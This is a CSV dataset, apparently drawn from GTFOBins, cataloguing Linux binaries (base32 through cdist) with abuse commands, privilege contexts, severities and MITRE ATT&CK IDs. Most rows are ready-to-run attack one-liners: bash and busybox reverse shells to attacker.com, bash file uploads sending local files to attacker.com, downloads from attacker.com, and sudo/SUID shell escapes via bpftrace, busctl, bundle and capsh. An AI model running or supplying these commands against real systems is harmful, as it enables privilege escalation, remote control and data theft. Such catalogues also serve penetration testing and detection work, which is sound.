111,Linux,base32 /path/to/input-file | base32 --decode,Abuse the 'base32' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/base32/
112,Linux,base32 /path/to/input-file | base32 --decode,Abuse the 'base32' binary (file read) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/base32/
113,Linux,base32 /path/to/input-file | base32 --decode,Abuse the 'base32' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/base32/
114,Linux,base58 /path/to/input-file | base58 --decode,Abuse the 'base58' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/base58/
115,Linux,base58 /path/to/input-file | base58 --decode,Abuse the 'base58' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/base58/
116,Linux,base64 /path/to/input-file | base64 --decode,Abuse the 'base64' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/base64/
117,Linux,base64 /path/to/input-file | base64 --decode,Abuse the 'base64' binary (file read) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/base64/
118,Linux,base64 /path/to/input-file | base64 --decode,Abuse the 'base64' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/base64/
119,Linux,basenc --base64 /path/to/input-file | basenc -d --base64,Abuse the 'basenc' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/basenc/
120,Linux,basenc --base64 /path/to/input-file | basenc -d --base64,Abuse the 'basenc' binary (file read) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/basenc/
121,Linux,basenc --base64 /path/to/input-file | basenc -d --base64,Abuse the 'basenc' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/basenc/
122,Linux,basez /path/to/input-file | basez --decode,Abuse the 'basez' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/basez/
123,Linux,basez /path/to/input-file | basez --decode,Abuse the 'basez' binary (file read) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/basez/
124,Linux,basez /path/to/input-file | basez --decode,Abuse the 'basez' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/basez/
125,Linux,"bash -c '{ echo -ne ""GET /path/to/input-file HTTP/1.0\r\nhost: attacker.com\r\n\r\n"" 1>&3; cat 0<&3; } \ 3<>/dev/tcp/attacker.com/12345 \ | { while read -r; do [ ""$REPLY"" = ""$(echo -ne ""\r"")"" ] && break; done; cat; } >/path/to/output-file'",Abuse the 'bash' binary (download) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/bash/
126,Linux,"bash -p -c '{ echo -ne ""GET /path/to/input-file HTTP/1.0\r\nhost: attacker.com\r\n\r\n"" 1>&3; cat 0<&3; } \ 3<>/dev/tcp/attacker.com/12345 \ | { while read -r; do [ ""$REPLY"" = ""$(echo -ne ""\r"")"" ] && break; done; cat; } >/path/to/output-file'",Abuse the 'bash' binary (download) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/bash/
127,Linux,"bash -c '{ echo -ne ""GET /path/to/input-file HTTP/1.0\r\nhost: attacker.com\r\n\r\n"" 1>&3; cat 0<&3; } \ 3<>/dev/tcp/attacker.com/12345 \ | { while read -r; do [ ""$REPLY"" = ""$(echo -ne ""\r"")"" ] && break; done; cat; } >/path/to/output-file'",Abuse the 'bash' binary (download) in a unprivileged context to escalate privileges or execute arbitrary actions.,File Download,Low,T1105,https://gtfobins.github.io/gtfobins/bash/
128,Linux,"bash -c 'echo ""$(</dev/tcp/attacker.com/12345) >/path/to/output-file'",Abuse the 'bash' binary (download) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/bash/
129,Linux,"bash -p -c 'echo ""$(</dev/tcp/attacker.com/12345) >/path/to/output-file'",Abuse the 'bash' binary (download) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/bash/
130,Linux,"bash -c 'echo ""$(</dev/tcp/attacker.com/12345) >/path/to/output-file'",Abuse the 'bash' binary (download) in a unprivileged context to escalate privileges or execute arbitrary actions.,File Download,Low,T1105,https://gtfobins.github.io/gtfobins/bash/
131,Linux,"bash -c 'echo ""$(</path/to/input-file)""'",Abuse the 'bash' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/bash/
132,Linux,"bash -p -c 'echo ""$(</path/to/input-file)""'",Abuse the 'bash' binary (file read) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/bash/
133,Linux,"bash -c 'echo ""$(</path/to/input-file)""'",Abuse the 'bash' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/bash/
134,Linux,HISTTIMEFORMAT=$'\r\e[K' history -c history -r /path/to/input-file history,Abuse the 'bash' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions. This only works interactively from an existing `bash` session.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/bash/
135,Linux,HISTTIMEFORMAT=$'\r\e[K' history -c history -r /path/to/input-file history,Abuse the 'bash' binary (file read) in a suid context to escalate privileges or execute arbitrary actions. This only works interactively from an existing `bash` session.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/bash/
136,Linux,HISTTIMEFORMAT=$'\r\e[K' history -c history -r /path/to/input-file history,Abuse the 'bash' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions. This only works interactively from an existing `bash` session.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/bash/
137,Linux,bash -c 'echo DATA >/path/to/output-file',Abuse the 'bash' binary (file write) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,High,T1548.003,https://gtfobins.github.io/gtfobins/bash/
138,Linux,bash -p -c 'echo DATA >/path/to/output-file',Abuse the 'bash' binary (file write) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,High,T1548.001,https://gtfobins.github.io/gtfobins/bash/
139,Linux,bash -c 'echo DATA >/path/to/output-file',Abuse the 'bash' binary (file write) in a unprivileged context to escalate privileges or execute arbitrary actions.,Arbitrary File Write,Medium,T1222,https://gtfobins.github.io/gtfobins/bash/
140,Linux,HISTIGNORE='history *' history -c DATA history -w /path/to/output-file,Abuse the 'bash' binary (file write) in a sudo context to escalate privileges or execute arbitrary actions. This only works interactively from an existing `bash` session. It adds timestamps to the output file.,Sudo Misconfiguration,High,T1548.003,https://gtfobins.github.io/gtfobins/bash/
141,Linux,HISTIGNORE='history *' history -c DATA history -w /path/to/output-file,Abuse the 'bash' binary (file write) in a suid context to escalate privileges or execute arbitrary actions. This only works interactively from an existing `bash` session. It adds timestamps to the output file.,SUID Binaries,High,T1548.001,https://gtfobins.github.io/gtfobins/bash/
142,Linux,HISTIGNORE='history *' history -c DATA history -w /path/to/output-file,Abuse the 'bash' binary (file write) in a unprivileged context to escalate privileges or execute arbitrary actions. This only works interactively from an existing `bash` session. It adds timestamps to the output file.,Arbitrary File Write,Medium,T1222,https://gtfobins.github.io/gtfobins/bash/
143,Linux,bash -c 'enable -f /path/to/lib.so x',Abuse the 'bash' binary (library load) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,High,T1548.003,https://gtfobins.github.io/gtfobins/bash/
144,Linux,bash -p -c 'enable -f /path/to/lib.so x',Abuse the 'bash' binary (library load) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,High,T1548.001,https://gtfobins.github.io/gtfobins/bash/
145,Linux,bash -c 'enable -f /path/to/lib.so x',Abuse the 'bash' binary (library load) in a unprivileged context to escalate privileges or execute arbitrary actions.,Library Load Hijack,Medium,T1574.006,https://gtfobins.github.io/gtfobins/bash/
146,Linux,bash -c 'exec bash -i &>/dev/tcp/attacker.com/12345 <&1',Abuse the 'bash' binary (reverse shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/bash/
147,Linux,bash -p -c 'exec bash -p -i &>/dev/tcp/attacker.com/12345 <&1',Abuse the 'bash' binary (reverse shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/bash/
148,Linux,bash -c 'exec bash -i &>/dev/tcp/attacker.com/12345 <&1',Abuse the 'bash' binary (reverse shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Reverse Shell,High,T1059,https://gtfobins.github.io/gtfobins/bash/
149,Linux,bash,Abuse the 'bash' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/bash/
150,Linux,bash -p,Abuse the 'bash' binary (shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/bash/
151,Linux,bash,Abuse the 'bash' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/bash/
152,Linux,"bash -c 'echo -e ""POST / HTTP/0.9\n\n$(</path/to/input-file)"" >/dev/tcp/attacker.com/12345'",Abuse the 'bash' binary (upload) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,High,T1548.003,https://gtfobins.github.io/gtfobins/bash/
153,Linux,"bash -p -c 'echo -e ""POST / HTTP/0.9\n\n$(</path/to/input-file)"" >/dev/tcp/attacker.com/12345'",Abuse the 'bash' binary (upload) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,High,T1548.001,https://gtfobins.github.io/gtfobins/bash/
154,Linux,"bash -c 'echo -e ""POST / HTTP/0.9\n\n$(</path/to/input-file)"" >/dev/tcp/attacker.com/12345'",Abuse the 'bash' binary (upload) in a unprivileged context to escalate privileges or execute arbitrary actions.,File Upload,Medium,T1105,https://gtfobins.github.io/gtfobins/bash/
155,Linux,"bash -c 'echo -n ""$(</path/to/input-file)"" >/dev/tcp/attacker.com/12345'",Abuse the 'bash' binary (upload) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,High,T1548.003,https://gtfobins.github.io/gtfobins/bash/
156,Linux,"bash -p -c 'echo -n ""$(</path/to/input-file)"" >/dev/tcp/attacker.com/12345'",Abuse the 'bash' binary (upload) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,High,T1548.001,https://gtfobins.github.io/gtfobins/bash/
157,Linux,"bash -c 'echo -n ""$(</path/to/input-file)"" >/dev/tcp/attacker.com/12345'",Abuse the 'bash' binary (upload) in a unprivileged context to escalate privileges or execute arbitrary actions.,File Upload,Medium,T1105,https://gtfobins.github.io/gtfobins/bash/
158,Linux,bashbug,Abuse the 'bashbug' binary (inherit) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/bashbug/
159,Linux,bashbug,Abuse the 'bashbug' binary (inherit) in a unprivileged context to escalate privileges or execute arbitrary actions.,Privilege Inheritance,Low,T1548,https://gtfobins.github.io/gtfobins/bashbug/
160,Linux,batcat --paging always /etc/hosts,Abuse the 'batcat' binary (inherit) in a sudo context to escalate privileges or execute arbitrary actions. `--paging always` can be omitted provided that the output doesn't fit the screen.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/batcat/
161,Linux,batcat --paging always /etc/hosts,Abuse the 'batcat' binary (inherit) in a suid context to escalate privileges or execute arbitrary actions. `--paging always` can be omitted provided that the output doesn't fit the screen.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/batcat/
162,Linux,batcat --paging always /etc/hosts,Abuse the 'batcat' binary (inherit) in a unprivileged context to escalate privileges or execute arbitrary actions. `--paging always` can be omitted provided that the output doesn't fit the screen.,Privilege Inheritance,Low,T1548,https://gtfobins.github.io/gtfobins/batcat/
163,Linux,bbot -d -cy /path/to/input-file,Abuse the 'bbot' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions. The file is displayed in the debug log.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/bbot/
164,Linux,bbot -d -cy /path/to/input-file,Abuse the 'bbot' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions. The file is displayed in the debug log.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/bbot/
165,Linux,bc -s /path/to/input-file quit,Abuse the 'bc' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions. The file content is actually parsed and appears as error messages.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/bc/
166,Linux,bc -s /path/to/input-file quit,Abuse the 'bc' binary (file read) in a suid context to escalate privileges or execute arbitrary actions. The file content is actually parsed and appears as error messages.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/bc/
167,Linux,bc -s /path/to/input-file quit,Abuse the 'bc' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions. The file content is actually parsed and appears as error messages.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/bc/
168,Linux,bconsole -c /path/to/file-input,Abuse the 'bconsole' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions. The file is actually parsed and the first wrong line is returned in an error message.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/bconsole/
169,Linux,bconsole -c /path/to/file-input,Abuse the 'bconsole' binary (file read) in a suid context to escalate privileges or execute arbitrary actions. The file is actually parsed and the first wrong line is returned in an error message.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/bconsole/
170,Linux,bconsole -c /path/to/file-input,Abuse the 'bconsole' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions. The file is actually parsed and the first wrong line is returned in an error message.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/bconsole/
171,Linux,bconsole @exec /bin/sh,Abuse the 'bconsole' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/bconsole/
172,Linux,bconsole @exec /bin/sh,Abuse the 'bconsole' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/bconsole/
173,Linux,bee eval '...',"Abuse the 'bee' binary (inherit) in a sudo context to escalate privileges or execute arbitrary actions. This allows to run PHP code (`...`). This must be excuted from the Backdrop CMS root directory (e.g. `/var/www/html`), alternatively use the `--root` option.",Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/bee/
174,Linux,bee eval '...',"Abuse the 'bee' binary (inherit) in a suid context to escalate privileges or execute arbitrary actions. This allows to run PHP code (`...`). This must be excuted from the Backdrop CMS root directory (e.g. `/var/www/html`), alternatively use the `--root` option.",SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/bee/
175,Linux,bee eval '...',"Abuse the 'bee' binary (inherit) in a unprivileged context to escalate privileges or execute arbitrary actions. This allows to run PHP code (`...`). This must be excuted from the Backdrop CMS root directory (e.g. `/var/www/html`), alternatively use the `--root` option.",Privilege Inheritance,Low,T1548,https://gtfobins.github.io/gtfobins/bee/
176,Linux,"borg extract @:/::: --rsh ""/bin/sh -c '/bin/sh </dev/tty >/dev/tty 2>/dev/tty'""",Abuse the 'borg' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/borg/
177,Linux,"borg extract @:/::: --rsh ""/bin/sh -c '/bin/sh </dev/tty >/dev/tty 2>/dev/tty'""",Abuse the 'borg' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/borg/
178,Linux,"bpftrace --unsafe -e 'BEGIN {system(""/bin/sh 1<&0"");exit()}'",Abuse the 'bpftrace' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/bpftrace/
179,Linux,"echo 'BEGIN {system(""/bin/sh 1<&0"");exit()}' >/path/to/temp-file bpftrace --unsafe /path/to/temp-file",Abuse the 'bpftrace' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/bpftrace/
180,Linux,bpftrace -c /bin/sh -e 'END {exit()}',Abuse the 'bpftrace' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/bpftrace/
181,Linux,bridge -b /path/to/input-file,Abuse the 'bridge' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions. Outputs the first line of the file (until the first whitespace) inside an error message to stdandard error.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/bridge/
182,Linux,bridge -b /path/to/input-file,Abuse the 'bridge' binary (file read) in a suid context to escalate privileges or execute arbitrary actions. Outputs the first line of the file (until the first whitespace) inside an error message to stdandard error.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/bridge/
183,Linux,bridge -b /path/to/input-file,Abuse the 'bridge' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions. Outputs the first line of the file (until the first whitespace) inside an error message to stdandard error.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/bridge/
184,Linux,bundle help,Abuse the 'bundle' binary (inherit) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/bundle/
185,Linux,bundle help,Abuse the 'bundle' binary (inherit) in a unprivileged context to escalate privileges or execute arbitrary actions.,Privilege Inheritance,Low,T1548,https://gtfobins.github.io/gtfobins/bundle/
186,Linux,touch Gemfile bundle console,Abuse the 'bundle' binary (inherit) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/bundle/
187,Linux,touch Gemfile bundle console,Abuse the 'bundle' binary (inherit) in a unprivileged context to escalate privileges or execute arbitrary actions.,Privilege Inheritance,Low,T1548,https://gtfobins.github.io/gtfobins/bundle/
188,Linux,BUNDLE_GEMFILE=x bundle exec /bin/sh,Abuse the 'bundle' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/bundle/
189,Linux,BUNDLE_GEMFILE=x bundle exec /bin/sh,Abuse the 'bundle' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/bundle/
190,Linux,touch Gemfile bundle exec /bin/sh,Abuse the 'bundle' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/bundle/
191,Linux,touch Gemfile bundle exec /bin/sh,Abuse the 'bundle' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/bundle/
192,Linux,"echo 'system(""/bin/sh"")' >Gemfile bundle install","Abuse the 'bundle' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions. This might run the shell twice, one after the other.",Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/bundle/
193,Linux,"echo 'system(""/bin/sh"")' >Gemfile bundle install","Abuse the 'bundle' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions. This might run the shell twice, one after the other.",Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/bundle/
194,Linux,busctl --show-machine,Abuse the 'busctl' binary (inherit) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/busctl/
195,Linux,busctl --show-machine,Abuse the 'busctl' binary (inherit) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/busctl/
196,Linux,busctl --show-machine,Abuse the 'busctl' binary (inherit) in a unprivileged context to escalate privileges or execute arbitrary actions.,Privilege Inheritance,Low,T1548,https://gtfobins.github.io/gtfobins/busctl/
197,Linux,"busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-c,argv2='/bin/sh -i 0<&2 1>&2'",Abuse the 'busctl' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/busctl/
198,Linux,"busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-pc,argv2='/bin/sh -p -i 0<&2 1>&2'",Abuse the 'busctl' binary (shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/busctl/
199,Linux,"busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-c,argv2='/bin/sh -i 0<&2 1>&2'",Abuse the 'busctl' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/busctl/
200,Linux,"busctl --address=unixexec:path=/bin/sh,argv1=-c,argv2='/bin/sh -i 0<&2 1>&2'",Abuse the 'busctl' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/busctl/
201,Linux,"busctl --address=unixexec:path=/bin/sh,argv1=-pc,argv2='/bin/sh -p -i 0<&2 1>&2'",Abuse the 'busctl' binary (shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/busctl/
202,Linux,"busctl --address=unixexec:path=/bin/sh,argv1=-c,argv2='/bin/sh -i 0<&2 1>&2'",Abuse the 'busctl' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/busctl/
203,Linux,busybox ash,Abuse the 'busybox' binary (inherit) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/busybox/
204,Linux,busybox ash,Abuse the 'busybox' binary (inherit) in a unprivileged context to escalate privileges or execute arbitrary actions.,Privilege Inheritance,Low,T1548,https://gtfobins.github.io/gtfobins/busybox/
205,Linux,busybox cat,Abuse the 'busybox' binary (inherit) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/busybox/
206,Linux,busybox cat,Abuse the 'busybox' binary (inherit) in a unprivileged context to escalate privileges or execute arbitrary actions.,Privilege Inheritance,Low,T1548,https://gtfobins.github.io/gtfobins/busybox/
207,Linux,busybox nc -e /bin/sh attacker.com 12345,Abuse the 'busybox' binary (reverse shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/busybox/
208,Linux,busybox nc -e /bin/sh attacker.com 12345,Abuse the 'busybox' binary (reverse shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Reverse Shell,High,T1059,https://gtfobins.github.io/gtfobins/busybox/
209,Linux,busybox httpd -f -p 12345 -h .,Abuse the 'busybox' binary (upload) in a sudo context to escalate privileges or execute arbitrary actions. This serves files in the local folder via an HTTP server.,Sudo Misconfiguration,High,T1548.003,https://gtfobins.github.io/gtfobins/busybox/
210,Linux,busybox httpd -f -p 12345 -h .,Abuse the 'busybox' binary (upload) in a unprivileged context to escalate privileges or execute arbitrary actions. This serves files in the local folder via an HTTP server.,File Upload,Medium,T1105,https://gtfobins.github.io/gtfobins/busybox/
211,Linux,byebug --no-stop /path/to/script.rb,Abuse the 'byebug' binary (inherit) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/byebug/
212,Linux,byebug --no-stop /path/to/script.rb,Abuse the 'byebug' binary (inherit) in a unprivileged context to escalate privileges or execute arbitrary actions.,Privilege Inheritance,Low,T1548,https://gtfobins.github.io/gtfobins/byebug/
213,Linux,bzip2 -c /path/to/input-file | bzip2 -d,Abuse the 'bzip2' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/bzip2/
214,Linux,bzip2 -c /path/to/input-file | bzip2 -d,Abuse the 'bzip2' binary (file read) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/bzip2/
215,Linux,bzip2 -c /path/to/input-file | bzip2 -d,Abuse the 'bzip2' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/bzip2/
216,Linux,cabal exec --project-file=/dev/null -- /bin/sh,Abuse the 'cabal' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/cabal/
217,Linux,cabal exec --project-file=/dev/null -- /bin/sh -p,Abuse the 'cabal' binary (shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/cabal/
218,Linux,cabal exec --project-file=/dev/null -- /bin/sh,Abuse the 'cabal' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/cabal/
219,Linux,cancel -h attacker.com:12345 -u DATA,Abuse the 'cancel' binary (upload) in a sudo context to escalate privileges or execute arbitrary actions. Data is sent as a POST request along with other content.,Sudo Misconfiguration,High,T1548.003,https://gtfobins.github.io/gtfobins/cancel/
220,Linux,cancel -h attacker.com:12345 -u DATA,Abuse the 'cancel' binary (upload) in a suid context to escalate privileges or execute arbitrary actions. Data is sent as a POST request along with other content.,SUID Binaries,High,T1548.001,https://gtfobins.github.io/gtfobins/cancel/
221,Linux,cancel -h attacker.com:12345 -u DATA,Abuse the 'cancel' binary (upload) in a unprivileged context to escalate privileges or execute arbitrary actions. Data is sent as a POST request along with other content.,File Upload,Medium,T1105,https://gtfobins.github.io/gtfobins/cancel/
222,Linux,capsh --,Abuse the 'capsh' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/capsh/
223,Linux,capsh --gid=0 --uid=0 --,Abuse the 'capsh' binary (shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/capsh/
224,Linux,capsh --,Abuse the 'capsh' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/capsh/
225,Linux,cargo help doc,Abuse the 'cargo' binary (inherit) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/cargo/
226,Linux,cargo help doc,Abuse the 'cargo' binary (inherit) in a unprivileged context to escalate privileges or execute arbitrary actions.,Privilege Inheritance,Low,T1548,https://gtfobins.github.io/gtfobins/cargo/
227,Linux,cat /path/to/input-file,Abuse the 'cat' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/cat/
228,Linux,cat /path/to/input-file,Abuse the 'cat' binary (file read) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/cat/
229,Linux,cat /path/to/input-file,Abuse the 'cat' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/cat/
230,Linux,cdist shell -s /bin/sh,Abuse the 'cdist' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/cdist/
231,Linux,cdist shell -s /bin/sh,Abuse the 'cdist' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/cdist/
